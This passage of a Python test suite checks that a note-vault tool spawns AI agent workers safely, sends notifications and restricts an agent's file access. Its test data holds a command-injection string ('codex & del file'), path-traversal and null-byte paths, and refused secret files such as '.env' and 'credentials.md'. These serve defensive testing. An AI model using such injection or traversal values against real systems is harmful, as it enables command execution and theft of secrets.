        self.spawn.stop()
        system = types.SimpleNamespace(**{**vars(os), 'name': 'nt' if windows else 'posix'})
        platform = types.SimpleNamespace(**{**vars(sys), 'platform': 'win32' if windows else 'linux'})
        fake = Mock(return_value=types.SimpleNamespace(pid=1234))
        if failure:
            fake.side_effect = failure
        with patch.object(yakala, 'os', system), patch.object(yakala, 'sys', platform), \
                patch.object(yakala, 'NO_WINDOW', 0x08000000), \
                patch.object(yakala, '_windows_python', return_value=sys.executable), \
                patch.object(yakala, '_windows_safe_command', side_effect=lambda argv: argv), \
                patch.object(yakala.subprocess, 'Popen', fake):
            if failure:
                with self.assertRaises(OSError):
                    yakala._agent_spawn_worker(self.vault, self.state)
            else:
                yakala._agent_spawn_worker(self.vault, self.state)
        return fake

    def test_posix_worker_has_its_own_session_and_no_popup_pipes(self):
        launch = self.launch()
        argv, = launch.call_args.args
        kwargs = launch.call_args.kwargs
        self.assertIsInstance(argv, list)
        self.assertTrue(kwargs.get('start_new_session'))
        self.assertTrue(kwargs.get('close_fds'))
        self.assertEqual(kwargs.get('stdin'), subprocess.DEVNULL)
        self.assertNotEqual(kwargs.get('stdout'), subprocess.PIPE)
        self.assertNotEqual(kwargs.get('stderr'), subprocess.PIPE)
        self.assertFalse(kwargs.get('shell', False))

    def test_windows_worker_breaks_away_without_allocating_a_console(self):
        launch = self.launch(windows=True)
        kwargs = launch.call_args.kwargs
        flags = kwargs.get('creationflags', 0)
        self.assertEqual(flags & 0x01000000, 0x01000000)  # CREATE_BREAKAWAY_FROM_JOB
        self.assertEqual(flags & 0x08000000, 0x08000000)  # CREATE_NO_WINDOW
        self.assertFalse(flags & (0x00000008 | 0x00000010))  # DETACHED_PROCESS / CREATE_NEW_CONSOLE
        self.assertTrue(kwargs.get('close_fds'))
        self.assertEqual(kwargs.get('stdin'), subprocess.DEVNULL)
        self.assertFalse(kwargs.get('shell', False))
        for key in ('TEMP', 'TMP'):
            target = Path(kwargs['env'][key]).resolve()
            self.assertTrue(target.is_relative_to(self.state.resolve()), (key, target))

    def test_breakaway_failure_is_not_retried_inside_the_popup_job(self):
        launch = self.launch(windows=True, failure=OSError('job does not allow breakaway'))
        launch.assert_called_once()


# Platform adapters and Windows COM registration.

class AgentPlatformTest(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name).resolve()  # _agent_register_toast passes the resolved vault

    def file(self, relative, text='fixture'):
        path = self.root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding='utf-8')
        return path

    def test_native_executable_no_subprocess_or_shell(self):
        exe = self.file('Program Files/claude.exe')
        with mock.patch.object(yakala.sys, 'platform', 'win32'), mock.patch.object(yakala.subprocess, 'run') as run:
            self.assertEqual(yakala._agent_executable('claude', str(exe)), [str(exe)])
            run.assert_not_called()

    def test_custom_executable_is_one_absolute_path(self):
        for configured in ('claude --x', ['claude'], '', 'claude.cmd', 'x\x00y'):
            with self.subTest(configured=configured), self.assertRaises(ValueError):
                yakala._agent_executable('claude', configured)

    def test_known_npm_shim_uses_node_and_never_reads_the_shim(self):
        shim = self.file('npm/claude.cmd', 'THIS MUST NEVER EXECUTE')
        script = self.file('npm/node_modules/@anthropic-ai/claude-code/cli.js')
        node = self.file('Node & Stuff/node.exe')
        with mock.patch.object(yakala.sys, 'platform', 'win32'), \
                mock.patch.object(yakala.shutil, 'which', return_value=str(node)), \
                mock.patch.object(Path, 'read_text', side_effect=AssertionError('shim read')):
            self.assertEqual(yakala._agent_executable('claude', str(shim)), [str(node), str(script)])

    def test_claude_npm_shim_with_packaged_native_binary_skips_node(self):
        shim = self.file('npm/claude.cmd', 'THIS MUST NEVER EXECUTE')
        native = self.file('npm/node_modules/@anthropic-ai/claude-code/bin/claude.exe')
        with mock.patch.object(yakala.sys, 'platform', 'win32'), \
                mock.patch.object(yakala.shutil, 'which', side_effect=AssertionError('node lookup')), \
                mock.patch.object(Path, 'read_text', side_effect=AssertionError('shim read')):
            self.assertEqual(yakala._agent_executable('claude', str(shim)), [str(native)])

    def test_codex_npm_script_and_sibling_node(self):
        shim = self.file('npm/codex.cmd')
        script = self.file('npm/node_modules/@openai/codex/bin/codex.js')
        node = self.file('npm/node.exe')
        with mock.patch.object(yakala.sys, 'platform', 'win32'):
            self.assertEqual(yakala._agent_executable('codex', shim), [str(node), str(script)])

    def test_unknown_batch_and_missing_package_fail_closed(self):
        bad = self.file('npm/unknown.cmd')
        missing = self.file('npm/claude.cmd')
        with mock.patch.object(yakala.sys, 'platform', 'win32'):
            with self.assertRaises(ValueError):
                yakala._agent_executable('claude', bad)
            with mock.patch.object(yakala.shutil, 'which', return_value=None), self.assertRaises(FileNotFoundError):
                yakala._agent_executable('claude', missing)

    def test_relative_shell_syntax_is_not_a_command_template(self):
        with self.assertRaises(ValueError):
            yakala._agent_executable('codex', 'codex & del file')

    def test_non_executable_posix_is_refused(self):
        exe = self.file('claude')
        with mock.patch.object(yakala.sys, 'platform', 'linux'), mock.patch.object(yakala.os, 'access', return_value=False), \
                self.assertRaises(PermissionError):
            yakala._agent_executable('claude', exe)

    def test_no_notification_backend_is_a_log_only_result(self):
        with mock.patch.object(yakala.sys, 'platform', 'linux'), \
                mock.patch.object(yakala.shutil, 'which', return_value=None), \
                mock.patch.object(yakala, '_agent_log', create=True) as log:
            self.assertFalse(yakala._agent_notify(self.root, 'card-123', 'started'))
            self.assertIn('notify-send-unavailable', log.call_args.args[2])

    def test_notification_exception_and_log_exception_never_propagate(self):
        with mock.patch.object(yakala.sys, 'platform', 'darwin'), \
                mock.patch.object(yakala.subprocess, 'run', side_effect=subprocess.TimeoutExpired('x', 5)), \
                mock.patch.object(yakala, '_agent_log', side_effect=OSError('disk full'), create=True):
            self.assertFalse(yakala._agent_notify(self.root, 'card-123', 'started'))

    def test_bad_event_or_id_does_not_start_a_command(self):
        with mock.patch.object(yakala.subprocess, 'run') as run, mock.patch.object(yakala, '_agent_log', create=True):
            self.assertFalse(yakala._agent_notify(self.root, '../../escape', 'started'))
            self.assertFalse(yakala._agent_notify(self.root, 'card-123', 'secret user request'))
            self.assertFalse(yakala._agent_notify(self.root, 'card-123', {'not': 'a string'}))
            run.assert_not_called()

    def test_macos_uses_fixed_script_and_separate_arguments(self):
        with mock.patch.object(yakala.sys, 'platform', 'darwin'), \
                mock.patch.object(yakala.subprocess, 'run') as run, mock.patch.object(yakala, '_agent_log', create=True):
            self.assertTrue(yakala._agent_notify(self.root, 'card-123', 'completed'))
            command = run.call_args.args[0]
            self.assertEqual(command[0], '/usr/bin/osascript')
            self.assertIn('on run argv', command[2])
            self.assertNotIn(command[3], command[2])
            self.assertEqual(run.call_args.kwargs['timeout'], 5)

    def test_windows_uses_registered_identity_static_ps_and_json_stdin(self):
        self.file('Windows/System32/WindowsPowerShell/v1.0/powershell.exe')
        with mock.patch.object(yakala.sys, 'platform', 'win32'), \
                mock.patch.dict(yakala.os.environ, {'SystemRoot': str(self.root / 'Windows')}), \
                mock.patch.object(yakala, '_agent_toast_registered', return_value=True), \
                mock.patch.object(yakala.subprocess, 'run') as run, mock.patch.object(yakala, '_agent_log', create=True):
            self.assertTrue(yakala._agent_notify(self.root, 'card-123', 'approval'))
            command, options = run.call_args.args[0], run.call_args.kwargs
            script = base64.b64decode(command[-1]).decode('utf-16le')
            data = json.loads(options['input'])
            self.assertIn(yakala.AGENT_TOAST_AUMID, script)
            self.assertIn('CreateTextNode', script)
            self.assertNotIn(data['title'], script)
            self.assertNotIn('card-123', script)
            self.assertNotIn('card-123', options['input'].decode())
            self.assertEqual(options['creationflags'], 0x08000000)
            self.assertEqual(options['timeout'], 5)
            self.assertNotIn('shell', options)

    def test_windows_unregistered_toast_is_not_spoofed(self):
        with mock.patch.object(yakala.sys, 'platform', 'win32'), \
                mock.patch.object(yakala, '_agent_toast_registered', return_value=False), \
                mock.patch.object(yakala.subprocess, 'run') as run, mock.patch.object(yakala, '_agent_log', create=True):
            self.assertFalse(yakala._agent_notify(self.root, 'card-123', 'started'))
            run.assert_not_called()

    def windows_notification(self, vault, target):
        self.file('Windows/System32/WindowsPowerShell/v1.0/powershell.exe')
        with mock.patch.object(yakala.sys, 'platform', 'win32'), \
                mock.patch.dict(yakala.os.environ, {'SystemRoot': str(self.root / 'Windows')}), \
                mock.patch.object(yakala, '_agent_toast_registered', return_value=True), \
                mock.patch.object(yakala.subprocess, 'run') as run, mock.patch.object(yakala, '_agent_log'):
            self.assertTrue(yakala._agent_notify(self.root, 'card-123', 'completed', target, vault=vault))
        command, options = run.call_args.args[0], run.call_args.kwargs
        self.assertNotIn('shell', options)
        self.assertNotIn('stdin', options)
        return command, json.loads(options['input'])

    def test_windows_launch_is_encoded_file_uri_in_stdin_and_xml_attributes(self):
        target = 'Notlar/sonu\u00e7 & #100% +.md'
        path = self.file('vault/' + target)
        command, payload = self.windows_notification(self.root / 'vault', target)
        script = base64.b64decode(command[-1]).decode('utf-16le')
        self.assertEqual(payload['launch'], path.resolve().as_uri())
        self.assertTrue(payload['launch'].startswith('file:///'))
        self.assertTrue(payload['launch'].endswith('/Notlar/sonu%C3%A7%20%26%20%23100%25%20%2B.md'))
        self.assertIn('ConvertFrom-Json -InputObject ([Console]::In.ReadToEnd())', script)
        self.assertIn("if ($payload.launch) {", script)
        self.assertIn("$xml.DocumentElement.SetAttribute('activationType', 'protocol')", script)
        self.assertIn("$xml.DocumentElement.SetAttribute('launch', [string]$payload.launch)", script)
        self.assertNotIn(payload['launch'], script)
        self.assertNotIn('LoadXml', script)
        other = self.file('vault/other.md')
        other_command, other_payload = self.windows_notification(self.root / 'vault', 'other.md')
        self.assertEqual(command, other_command)
        self.assertEqual(other_payload['launch'], other.resolve().as_uri())
        self.assertEqual(set(payload), {'title', 'body', 'launch'})

    def test_windows_bad_target_keeps_notification_without_launch(self):
        self.file('vault/card.md')
        outside = self.file('outside.md')
        for target in ('../outside.md', 'nested/../card.md', str(outside), outside.as_uri(),
                       'C:/outside.md', '//server/share/note.md', 'missing.md',
                       'folder', 'bad\x00.md', {'path': 'card.md'}):
            with self.subTest(target=target):
                _, payload = self.windows_notification(self.root / 'vault', target)
                self.assertEqual(payload['launch'], '')
        _, payload = self.windows_notification(None, 'card.md')
        self.assertEqual(payload['launch'], '')

    def test_windows_link_outside_vault_keeps_notification_without_launch(self):
        self.file('vault/card.md')
        outside = self.file('outside.md')
        link = self.root / 'vault/link.md'
        try:
            link.symlink_to(outside)
        except OSError:
            self.skipTest('Symlink creation is unavailable on this host.')
        _, payload = self.windows_notification(self.root / 'vault', 'link.md')
        self.assertEqual(payload['launch'], '')

    def test_toast_setup_registers_only_owned_shortcut_and_detects_tampering(self):
        state, vault, link = self.root / 'state', self.root / 'vault', self.root / 'StartMenu' / yakala.AGENT_TOAST_LINK
        vault.mkdir()
        def save(path, target, args, cwd):
            self.assertEqual(cwd, vault)
            self.assertIn('--vault', args)
            self.assertTrue(args.endswith('ajan'))
            path.write_bytes(b'fake link with AUMID')
        with mock.patch.object(yakala.sys, 'platform', 'win32'), \
                mock.patch.object(yakala, '_agent_toast_location', return_value=link), \
                mock.patch.object(yakala, '_agent_write_toast_shortcut', side_effect=save):
            self.assertTrue(yakala._agent_register_toast(state, vault))
            self.assertTrue(yakala._agent_toast_registered(state))
            self.assertTrue(yakala._agent_register_toast(state, vault))
            link.write_bytes(b'other user shortcut')
            self.assertFalse(yakala._agent_toast_registered(state))
            self.assertFalse(yakala._agent_register_toast(state, vault))
            self.assertEqual(link.read_bytes(), b'other user shortcut')


class FakeCOM:
    """ctypes vtables exercise ABI indices without loading a Windows DLL."""
    def __init__(self, failure=False):
        self.keep = []
        self.calls = []
        self.failure = failure
        self.handles = {}
        self.CoInitializeEx = self.function(lambda *args: 0)
        self.CoUninitialize = self.function(lambda: self.calls.append(('uninitialize',)))
        self.CoCreateInstance = self.function(self.create)
        self.make('store', 8, {6: (self.setvalue, [C.c_void_p, C.c_void_p]),
                               7: (lambda *args: 0, [])})
        self.make('persist', 9, {6: (self.save, [C.c_wchar_p, C.c_int32])})
        def string_call(name):
            def receive(this, value):
                self.calls.append((name, value))
                return 0
            return receive
        self.make('link', 21, {0: (self.query, [C.c_void_p, C.c_void_p]),
                               7: (string_call('description'), [C.c_wchar_p]),
                               9: (string_call('cwd'), [C.c_wchar_p]),
                               11: (string_call('arguments'), [C.c_wchar_p]),
                               15: (string_call('show'), [C.c_int32]),
                               20: (string_call('target'), [C.c_wchar_p])})

    @staticmethod
    def function(fn):
        class Function:
            def __call__(self, *args):
                return fn(*args)
        return Function()

    def make(self, name, length, methods):
        def release(this):
            self.calls.append(('release', name))
            return 0
        methods[2] = (release, [])
        table = (C.c_void_p * length)()
        for index, (method, params) in methods.items():
            callback = C.CFUNCTYPE(C.c_int32, C.c_void_p, *params)(method)
            self.keep.append(callback)
            table[index] = C.cast(callback, C.c_void_p).value
        interface = (C.c_void_p * 1)(C.addressof(table))
        self.keep.extend((table, interface))
        self.handles[name] = C.addressof(interface)

    def create(self, clsid, outer, context, iid, output):
        C.cast(output, C.POINTER(C.c_void_p))[0] = self.handles['link']
        return 0

    def query(self, this, iid, output):
        identity = uuid.UUID(bytes_le=C.string_at(iid, 16))
        name = 'store' if identity == uuid.UUID('886d8eeb-8cf2-4446-8d02-cdba1dbdcf99') else 'persist'
        C.cast(output, C.POINTER(C.c_void_p))[0] = self.handles[name]
        return 0

    def setvalue(self, this, key, value):
        fmtid = str(uuid.UUID(bytes_le=C.string_at(key, 16)))
        pid = C.c_uint32.from_address(key + 16).value
        vt = C.c_uint16.from_address(value).value
        string = C.wstring_at(C.c_void_p.from_address(value + 8).value)
        self.calls.append(('setvalue', fmtid, pid, vt, string))
        return -2147467259 if self.failure else 0

    def save(self, this, path, remember):
        self.calls.append(('save', path, remember))
        Path(path).write_bytes(b'fake COM link')
        return 0


class AgentCOMTest(unittest.TestCase):
    def test_com_sets_aumid_and_releases_each_interface(self):
        com = FakeCOM()
        with tempfile.TemporaryDirectory() as temporary, \
                mock.patch.object(C, 'WinDLL', return_value=com, create=True), \
                mock.patch.object(C, 'WINFUNCTYPE', C.CFUNCTYPE, create=True):
            path = Path(temporary) / 'test.lnk'
            yakala._agent_write_toast_shortcut(path, 'python.exe', 'args', temporary)
            self.assertTrue(path.is_file())
            self.assertIn(('setvalue', '9f4c2855-9f79-4b39-a8d0-e1d42de1d5f3',
                           5, 31, yakala.AGENT_TOAST_AUMID), com.calls)
            self.assertEqual([call for call in com.calls if call[0] == 'release'],
                             [('release', 'persist'), ('release', 'store'), ('release', 'link')])
            self.assertEqual(com.calls[-1], ('uninitialize',))

    def test_com_failure_releases_acquired_interfaces(self):
        com = FakeCOM(failure=True)
        with mock.patch.object(C, 'WinDLL', return_value=com, create=True), \
                mock.patch.object(C, 'WINFUNCTYPE', C.CFUNCTYPE, create=True), self.assertRaises(OSError):
            yakala._agent_write_toast_shortcut('unused.lnk', 'python.exe', 'args', '.')
        self.assertEqual([call for call in com.calls if call[0] == 'release'],
                         [('release', 'store'), ('release', 'link')])
        self.assertEqual(com.calls[-1], ('uninitialize',))


# Restricted MCP capabilities and pinned public-network transport.

class AgentBridgeFilesTest(unittest.TestCase):
    def setUp(self):
        temporary = tempfile.TemporaryDirectory(prefix='yakala-agent-bridge-')
        self.addCleanup(temporary.cleanup)
        base = Path(temporary.name).resolve()  # the bridge is started with a resolved vault and state
        self.vault, self.state = base / 'Örnek Vault', base / 'state'
        self.vault.mkdir()
        self.state.mkdir()
        result = yakala.capture(self.vault, url='https://example.com/music', why='Find the music', state=self.state)
        self.job = {'id': str(uuid.uuid4()), 'card_id': result['id'], 'card_path': result['path'],
                    'request': 'Find the music', 'url': 'https://example.com/music', 'client': 'claude',
                    'session_id': str(uuid.uuid4()), 'state': 'running', 'worker_pid': os.getpid(),
                    'worker_identity': yakala._agent_process_identity(os.getpid()),
                    'runtime_deadline_ns': time.monotonic_ns() + 900 * 1000000000}
        self.job_folder = self.state / 'yakala' / 'ajan' / self.job['id']
        self.job_folder.mkdir(parents=True)
        for name, value in (('_agent_job_dir', lambda vault, state, job_id: self.job_folder),
                            ('_agent_load_job', lambda vault, state, job_id: dict(self.job))):
            mocked = patch.object(yakala, name, value, create=True)
            mocked.start()
            self.addCleanup(mocked.stop)

    def call(self, name, **arguments):
        return yakala._agent_tool_call(self.vault, self.state, self.job['id'], name, arguments)

    def note(self, path, content='Example text'):
        target = self.vault / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding='utf-8', newline='')  # keep the given line endings on Windows too
        return target

    def transfer(self, body=b'ID3\x04\0\0\0\0\0\0a test track'):
        def fetch(url, byte_limit, output):
            self.assertEqual(byte_limit, 50 * 1024 * 1024)
            output.write(body)
            return {'url': url, 'body': None, 'bytes': len(body), 'content_type': 'audio/mpeg',
                    'sha256': hashlib.sha256(body).hexdigest()}
        return patch.object(yakala, '_agent_public_get', side_effect=fetch)

    def authorize_links(self, *urls):
        import html
        body = ('<html>' + ''.join('<a href="' + html.escape(url, quote=True) + '">source</a>'
                                 for url in urls) + '</html>').encode('utf-8')
        with patch.object(yakala, '_agent_public_get', return_value={
                'url': self.job['url'], 'body': body, 'content_type': 'text/html; charset=utf-8'}):
            return self.call('fetch_source', url=self.job['url'])

    def test_visible_notes_and_exact_control_files_are_available(self):
        for path in ('knowledge/concept.md', 'AGENTS.md', 'CLAUDE.md',
                     '.agents/skills/beyin-yakala/SKILL.md', '.claude/skills/beyin-yakala/SKILL.md'):
            self.note(path)
            self.assertEqual(self.call('read_note', path=path)['text'], 'Example text')

    def test_only_a_running_job_can_use_its_capabilities(self):
        self.note('knowledge/allowed.md')
        with patch.object(yakala, '_agent_read_note') as read:
            for state in ('preparing', 'queued', 'completed', 'failed', 'approval_required'):
                self.job['state'] = state
                with self.subTest(state=state), self.assertRaises(ValueError):
                    self.call('read_note', path='knowledge/allowed.md')
            read.assert_not_called()

    def test_hidden_secrets_binary_absolute_traversal_and_devices_are_refused(self):
        for path in ('.claude/settings.json', '.env', 'credentials.md', 'secrets/a.md', 'kasa/b.md',
                     '../outside.md', 'C:/Users/a.md', '//server/share/a.md', r'..\outside.md',
                     'NUL.md', 'note.md:stream', 'knowledge/note.md.', 'picture.png'):
            with self.subTest(path=path), self.assertRaises((OSError, ValueError)):
                self.call('read_note', path=path)

    def test_note_link_and_directory_link_are_not_followed(self):
        ordinary = self.note('ordinary.md', 'ordinary')
        linked = self.vault / 'link.md'
        try:
            linked.symlink_to(ordinary)
        except OSError as exc:
            self.skipTest('Symlink creation is not permitted: ' + str(exc))
        with self.assertRaises(ValueError):
            self.call('read_note', path='link.md')
        (self.vault / 'linked').symlink_to(self.vault, target_is_directory=True)
        with self.assertRaises(ValueError):
            self.call('read_note', path='linked/ordinary.md')

    def test_only_current_raw_and_explicitly_attached_text_are_available(self):
        parent = Path(self.job['card_path']).parent
        raw = (parent / '.ham' / (self.job['card_id'] + '.md')).as_posix()
        other = (parent / '.ham' / 'other.md').as_posix()
        self.note(raw, 'Current captured text')
        self.note(other, 'Other captured text')
        self.assertEqual(self.call('read_note', path=raw)['text'], 'Current captured text')
        with self.assertRaises(ValueError):
            self.call('read_note', path=other)
        attached, unrelated = (parent / 'dosyalar' / 'attached.txt').as_posix(), (parent / 'dosyalar' / 'other.txt').as_posix()
        self.note(attached)
        self.note(unrelated)
        card = self.vault / self.job['card_path']
        card.write_text(card.read_text(encoding='utf-8') + '\n## Dosyalar\n\n- [[' + attached + ']]\n', encoding='utf-8')
        self.assertEqual(self.call('read_note', path=attached)['text'], 'Example text')
        with self.assertRaises(ValueError):
            self.call('read_note', path=unrelated)

    def test_sensitive_source_card_name_is_readable_only_for_its_job(self):
        canary = 'source-filename-canary'
        for word in ('gizli', 'sifre', 'password'):
            own = yakala.capture(self.vault, text=canary, title=word + ' kaynak', state=self.state)
            self.job.update(card_id=own['id'], card_path=own['path'])
            with self.subTest(word=word):
                self.assertTrue(yakala._agent_private_name(Path(own['path']).name))
                self.assertIn(canary, self.call('read_note', path=own['path'])['text'])
                self.assertEqual(self.call('search_notes', query=canary)['matches'], [])
                self.job.update(card_path='another-card.md')
                with self.assertRaisesRegex(ValueError, 'Hidden and sensitive'):
                    self.call('read_note', path=own['path'])

    def test_other_sensitive_notes_and_cards_remain_unavailable(self):
        other = yakala.capture(self.vault, url='https://example.com/other', title='gizli kart', state=self.state)
        for path in ('knowledge/gizli.md', other['path']):
            with self.subTest(path=path):
                if path != other['path']:
                    self.note(path)
                with self.assertRaisesRegex(ValueError, 'Hidden and sensitive'):
                    self.call('read_note', path=path)

    def test_sensitive_source_raw_and_only_linked_attachment_are_readable(self):
        own = yakala.capture(self.vault, text='Source text', title='gizli kaynak', state=self.state)
        self.job.update(card_id=own['id'], card_path=own['path'])
        parent = Path(own['path']).parent
        raw = (parent / yakala.RAW / (own['id'] + '.md')).as_posix()
        attached = (parent / yakala.FILES / 'gizli-ek.txt').as_posix()
        unrelated = (parent / yakala.FILES / 'gizli-diger.txt').as_posix()
        other_raw = (parent / yakala.RAW / 'gizli-diger.md').as_posix()
        for path in (raw, attached, unrelated, other_raw):
            self.note(path, '---\nvisibility: private\n---\nSource file text')
        card = self.vault / own['path']
        card.write_text(card.read_text(encoding='utf-8') + '\n- [[' + attached + ']]\n', encoding='utf-8')
        for path in (raw, attached):
            with self.subTest(path=path):
                self.assertIn('Source file text', self.call('read_note', path=path)['text'])
        for path in (unrelated, other_raw):
            with self.subTest(path=path), self.assertRaises(ValueError):
                self.call('read_note', path=path)

    def test_source_filename_exception_preserves_hidden_and_sensitive_directories(self):
        for folder in ('.hidden', 'gizli'):
            self.job.update(card_id='gizli-kart', card_path=folder + '/gizli-kart.md')
            paths = (self.job['card_path'], folder + '/' + yakala.RAW + '/gizli-kart.md',
                     folder + '/' + yakala.FILES + '/gizli-ek.txt')
            for path in paths:
                self.note(path)
                with self.subTest(path=path), self.assertRaisesRegex(ValueError, 'Hidden and sensitive'):
                    self.call('read_note', path=path)
        self.job.update(card_path='knowledge/.gizli.md')
        self.note(self.job['card_path'])
        with self.assertRaisesRegex(ValueError, 'Hidden and sensitive'):
            self.call('read_note', path=self.job['card_path'])

    def test_source_filename_exception_preserves_explicit_metadata_bans(self):
        self.job.update(card_id='gizli-kart', card_path='knowledge/gizli-kart.md')
        raw = 'knowledge/' + yakala.RAW + '/gizli-kart.md'
        attached = 'knowledge/' + yakala.FILES + '/gizli-ek.txt'
        for field in ('remote_allowed: false', 'sensitivity: sensitive', 'kaynak_guveni: blocked'):
            header = '---\n' + field + '\n---\n'
            self.note(self.job['card_path'], header + '[[' + attached + ']]')
            self.note(raw)
            self.note(attached)
            for path in (self.job['card_path'], raw, attached):
                with self.subTest(field=field, path=path), self.assertRaisesRegex(ValueError, 'frontmatter forbids'):
                    self.call('read_note', path=path)

    def test_case_and_short_aliases_cannot_impersonate_the_source_card(self):
        own = 'knowledge/gizli-kart.md'
        foreign = self.note('knowledge/gizli-diger.md', 'FOREIGN_CARD_CANARY')
        self.job.update(card_path=own)
        original = yakala._agent_checked_path

        def alias_lookup(root, parts, create=False):
            if '/'.join(parts) in (own, own.upper(), 'knowledge/GIZLIK~1.MD', 'knowledge/ordinary.md'):
                return foreign
            return original(root, parts, create=create)

        # Simulate aliases on every host, including an exact spelling with a foreign canonical target.
        with patch.object(yakala, '_agent_checked_path', side_effect=alias_lookup):
            for path in (own, own.upper(), 'knowledge/GIZLIK~1.MD', 'knowledge/ordinary.md'):
                with self.subTest(path=path), self.assertRaisesRegex(ValueError, 'Hidden and sensitive'):
                    self.call('read_note', path=path)

    def test_note_reads_are_bounded_and_reject_binary(self):
        self.note('large.md', 'x' * (200 * 1024 + 1))
        self.note('binary.md', 'first\0second')
        for path in ('large.md', 'binary.md'):
            with self.assertRaises(ValueError):
                self.call('read_note', path=path)

    def test_explicit_remote_ban_sensitive_and_blocked_metadata_are_honored(self):
        for index, field in enumerate(('remote_allowed: false', 'remote_allowed: "false"',
                                       'remote_allowed: false # local only', 'remote_allowed: "false" # local only',
                                       'remote_allowed: \n  false',
                                       'sensitivity: sensitive', 'kaynak_guveni: blocked')):
            path = 'knowledge/item-%d.md' % index
            self.note(path, '---\n' + field + '\n---\nneedle that must remain local')
            with self.assertRaises(ValueError):
                self.call('read_note', path=path)
        self.assertEqual(self.call('search_notes', query='needle')['matches'], [])
        self.note('ordinary.md', '---\nvisibility: internal\n---\nordinary authorized internal note')
        self.assertIn('ordinary authorized', self.call('read_note', path='ordinary.md')['text'])

    def test_json_and_quoted_yaml_privacy_flags_control_both_reading_and_search(self):
        canary = 'metadata-permission-canary'
        cases = (
            ('json-false', '{"remote_allowed":false}', False),
            ('json-true', '{"remote_allowed":true,"visibility":"internal"}', True),
            ('json-true-private', '{"remote_allowed":true,"visibility":"private"}', False),
            ('json-sensitive', '{"remote_allowed":true,"sensitivity":"sensitive"}', False),
            ('json-escaped-key-false', r'{"remote\u005fallowed":false}', False),
            ('json-escaped-key-true', r'{"remote\u005fallowed":true}', True),
            ('json-escaped-value', r'{"sensitivity":"sensi\u0074ive","remote_allowed":true}', False),
            ('json-pretty', '{\n  "remote_allowed": true,\n  "visibility": "internal"\n}', True),
            ('yaml-double-quoted-key', '"remote_allowed": false', False),
            ('yaml-single-quoted-key', "'remote_allowed': false", False),
            ('yaml-quoted-key-true', '"remote_allowed": true\nvisibility: internal', True),
            ('yaml-true-private', '"remote_allowed": true\nvisibility: private', False),
            ('yaml-quoted-blocked', '"kaynak_guveni": blocked', False),
        )
        expected = []
        for index, (label, header, allowed) in enumerate(cases):
            path = 'knowledge/guard-%02d.md' % index
            self.note(path, '---\n' + header + '\n---\n' + canary)
            with self.subTest(case=label):
                if allowed:
                    self.assertIn(canary, self.call('read_note', path=path)['text'])
                    expected.append(path)
                else:
                    with self.assertRaises(ValueError):
                        self.call('read_note', path=path)
        matches = self.call('search_notes', query=canary)['matches']
        self.assertEqual(sorted(item['path'] for item in matches), sorted(expected))

    def test_ambiguous_or_malformed_metadata_is_never_returned_as_plain_note_text(self):
        canary = 'rejected-metadata-canary'
        cases = (
            ('json-duplicate', '{"remote_allowed":false,"remote_allowed":true}', True),
            ('json-escaped-duplicate', r'{"remote_allowed":false,"remote\u005fallowed":true}', True),
            ('json-malformed', '{"remote_allowed" true}', True),
            ('json-trailing-comma', '{"remote_allowed":true,}', True),
            ('json-array', '[{"remote_allowed":false}]', True),
            ('json-string', '"remote_allowed"', True),
            ('yaml-duplicate', 'remote_allowed: false\nremote_allowed: true', True),
            ('yaml-quoted-duplicate', '"remote_allowed": false\nremote_allowed: true', True),
            ('yaml-malformed', 'remote_allowed true', True),
            ('json-unclosed-frontmatter', '{"remote_allowed":false}', False),
            ('yaml-unclosed-frontmatter', 'remote_allowed: false', False),
        )
        for index, (label, header, closed) in enumerate(cases):
            path = 'knowledge/invalid-%02d.md' % index
            self.note(path, '---\n' + header + '\n' + ('---\n' if closed else '') + canary)
            with self.subTest(case=label), self.assertRaises(ValueError):
                self.call('read_note', path=path)
        self.assertEqual(self.call('search_notes', query=canary)['matches'], [])

    def test_source_card_remote_ban_also_protects_its_raw_text(self):
        card = self.vault / self.job['card_path']
        meta, body = yakala.read_card(card)
        meta['remote_allowed'] = False
        yakala.write_card(card, meta, body)
        raw = (Path(self.job['card_path']).parent / '.ham' / (self.job['card_id'] + '.md')).as_posix()
        self.note(raw, 'private raw source')
        with self.assertRaises(ValueError):
            self.call('read_note', path=raw)

    def test_private_notes_stay_out_except_this_jobs_own_card_raw_and_results(self):
        # Hook context never shows `visibility: private` (audience "internal"); neither may a job
        # that also has public fetch and web search. Its own card and outputs stay readable.
        # Names carry no kasa-class word, so only the visibility gate can refuse these. Quoted and
        # commented forms included: capture's own _dump writes `visibility: "private"`.
        canary = 'gunluk-izi-canary'
        headers = {'plain': 'visibility: private', 'double': 'visibility: "private"',
                   'single': "visibility: 'private'", 'comment': 'visibility: private # yalniz yerel',
                   'json': '{"visibility": "private"}'}
        paths = []
        for name, header in headers.items():
            paths.append('knowledge/gunluk-%s.md' % name)
            self.note(paths[-1], '---\n' + header + '\n---\n' + canary)
        other = yakala.capture(self.vault, text='Alisveris listesi ' + canary, why='Baska is', state=self.state)
        self.assertIn('visibility: "private"', (self.vault / other['path']).read_text(encoding='utf-8'))
        for path in paths + [other['path']]:
            with self.subTest(path=path), self.assertRaisesRegex(ValueError, 'visibility: private'):
                self.call('read_note', path=path)
        self.assertEqual(self.call('search_notes', query=canary)['matches'], [])
        own = yakala.capture(self.vault, text='Bu isin pano metni', why='Ozetle', state=self.state)
        self.assertEqual(yakala.find_card(self.vault, own['id'], self.state)['meta']['visibility'], 'private')
        self.job.update(card_id=own['id'], card_path=own['path'], url='')
        self.assertIn('Bu isin pano metni', self.call('read_note', path=own['path'])['text'])
        raw = (Path(own['path']).parent / '.ham' / (own['id'] + '.md')).as_posix()
        self.note(raw, '---\nvisibility: private\n---\nham metin')
        self.assertIn('ham metin', self.call('read_note', path=raw)['text'])
        result = self.call('write_note', title='Ozet', content='Sonuc metni')
        self.assertIn('Sonuc metni', self.call('read_note', path=result['path'])['text'])

    def test_search_excludes_hidden_sensitive_and_attachment_folders(self):
        self.note('.cache/needle.md', 'needle')
        self.note('passwords/needle.md', 'needle')
        self.note((Path(self.job['card_path']).parent / 'dosyalar/needle.md').as_posix(), 'needle')
        self.note('knowledge/needle.md', 'needle')
        result = self.call('search_notes', query='needle')
        self.assertEqual([item['path'] for item in result['matches']], ['knowledge/needle.md'])

    def test_search_has_a_thirty_result_limit(self):
        for index in range(34):
            self.note('knowledge/item-%02d.md' % index, 'distinctive marker')
